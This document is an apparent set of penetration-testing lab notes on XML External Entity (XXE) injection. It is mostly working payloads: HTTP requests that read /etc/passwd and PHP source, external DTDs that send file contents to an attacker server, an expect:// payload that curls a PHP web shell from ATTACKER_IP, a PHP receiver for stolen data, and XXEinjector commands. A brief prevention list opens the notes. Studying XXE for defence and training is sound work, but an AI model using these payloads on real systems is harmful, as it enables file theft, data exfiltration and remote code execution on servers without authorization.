### Content
* [[#Overview]]
* [[#Local File Disclosure]]
	* [[#Read file contains some of XML's special characters]]
		* [[#Read PHP files using PHP wrapper]]
		* [[#Advanced Exfiltration with CDATA]] **(for any web application backend)**
* [[#Remote Code Execution]]
	* PHP
* [[#Blind XXE]]
	* [[#Error Based XXE]]
	* [[#Out-of-band Data Exfiltration]] **(Fully blind)**
		* Manually
		* Automated
---
## Overview
[XML External Entity (XXE) Injection](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- Cause: Occurs when [[XML]] data is taken from a user-controlled input without properly sanitizing or safely parsing it.
- Exploitation: An attacker supplies malicious [[XML]] data containing external entity references.
- Impact:
    - File Disclosure
    - SSRF (Server-Side Request Forgery)
    - Denial of Service (DoS)
    - Remote Code Execution (RCE)
- Prevention:
    - Disable External Entity Processing: Configure XML parsers to ignore external entities.
    - Use Safer Parsers: Some parsers don’t support external entities by default.
    - Input Validation: Avoid parsing XML from untrusted sources if possible.

**Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm).**

---
## Local File Disclosure
* **Request**
``` HTTP
POST /submitDetails.php HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [<!ENTITY email SYSTEM "file:///etc/passwd">]>
<root>
	<name>a</name>
	<tel>1</tel>
	<email>&email;</email>
	<message>123</message>
</root>
```
* **Response**
``` HTTP
HTTP/1.1 200 OK

Check your email root:x:0:0:root:/root:/bin/bash
xxe:x:1000:1000:xxe:/home/xxe:/bin/bash
 for further instructions.
[SNIP]....
```
**Tip:** In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.
### Read file contains some of XML's special characters
#### Read PHP files using PHP wrapper
Encode PHP source files, such that they would not break the XML format when referenced.
- **Request**
``` HTTP
POST /submitDetails.php HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [<!ENTITY company SYSTEM 
"php://filter/convert.base64-encode/resource=index.php">]>
<root>
	<name>a</name>
	<tel>1</tel>
	<email>&email;</email>
	<message>123</message>
</root>
```
* **Response**
``` HTTP
HTTP/1.1 200 OK

Check your email PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQoNCjxoZWFkPg0KCTx0aXRsZT5FbnRpdHkg
....
for further instructions.
[SNIP]....
```
#### Advanced Exfiltration with CDATA
To output data that does not conform to the XML format:
- Wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). and utilize XML Parameter Entities. 
- `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD.
- What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined.

- Attacker host
Create `xxe.dtd` with the content:
``` dtd
<!ENTITY joined "%begin;%file;%end;">
```
Start a python server:
``` bash
python3 -m http.server 8000
```
* Request to the target
``` HTTP
POST /submitDetails.php HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<root>
	<name>a</name>
	<tel>1</tel>
	<email>&joined;</email>    <!-- reference the &joined; entity to print the file content -->
	<message>123</message>
</root>
```
---
## Remote Code Execution
### PHP 
This method requires the PHP `expect` module to be installed and enabled.
* Attacker host
``` bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
* Send the request with payload
``` HTTP
POST /submitDetails.php HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY email SYSTEM "expect://curl$IFS-O$IFS'ATTACKER_IP/shell.php'">]>
<root>
	<name>a</name>
	<tel>1</tel>
	<email>&email;</email>
	<message>123</message>
</root>
```
---
## Blind XXE
### Error Based XXE
If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input
- Request
``` HTTP
POST /error/submitDetails.php HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<root>
<name>a</name>
<tel>1</tel>
<email>&joined;</email>
<message>1</message>
</root>
```
- Response
``` HTTP
HTTP/1.1 200 OK

<br />
<b>Warning</b>:  DOMDocument::loadXML(): Entity 'joined' not defined in Entity, line: 5 in <b>/var/www/html/error/submitDetails.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  simplexml_import_dom(): Invalid Nodetype to import in <b>/var/www/html/error/submitDetails.php</b>
[SNIP]....
Check your email for further instructions.
```
- The request we sent caused the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files.
- Attack host
``` bash
cat > xxe.dtd
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
^C
python3 -m http.server 8000
```
The web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error.
- Call our external DTD script, and then reference the `error` entity:
``` HTTP
POST /error/submitDetails.php HTTP/1.1

<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
- Response
``` HTTP
HTTP/1.1 200 OK

<b>Notice</b>:  DOMDocument::loadXML(): PEReference: %nonExistingEntity; not found in http://10.10.15.200:8000/xxe.dtd, line: 2 in <b>/var/www/html/error/submitDetails.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  DOMDocument::loadXML(): Invalid URI: /127.0.0.1 localhost
127.0.1.1 academy_webattacks_xxe

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
[SNIP].....
```
`this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.
### Out-of-band Data Exfiltration
Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.
#### Manually 
* On attacker machine
Create `xxe.dtd` with the content:
``` dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
Create `index.php` with the content:
``` PHP
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
Start PHP server:
``` bash
php -S 0.0.0.0:8000
```
- Send request to the target
``` HTTP
POST /error/submitDetails.php HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
- Data retrieved on the Response on the PHP server
``` TXT
[Mon Nov 11 22:04:06 2024] 10.129.155.229:50464 [200]: GET /?content=PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K
[Mon Nov 11 22:04:06 2024] 10.129.155.229:50464 Closing
[Mon Nov 11 22:04:06 2024] 10.129.155.229:50466 Accepted
[Mon Nov 11 22:04:06 2024] 

<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
```
#### Automated
- [XXEinjector](https://github.com/enjoiz/XXEinjector)
- Copy the HTTP request from Burp and write it to a file for the tool to use. 
- Don't include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:
``` HTTP
POST /blind/submitDetails.php HTTP/1.1
[Headers_SNIP]....

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```
- run the tool
``` bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
* All exfiltrated files get stored in the Logs folder under the tool `cat Logs/10.129.201.94/etc/passwd.log`
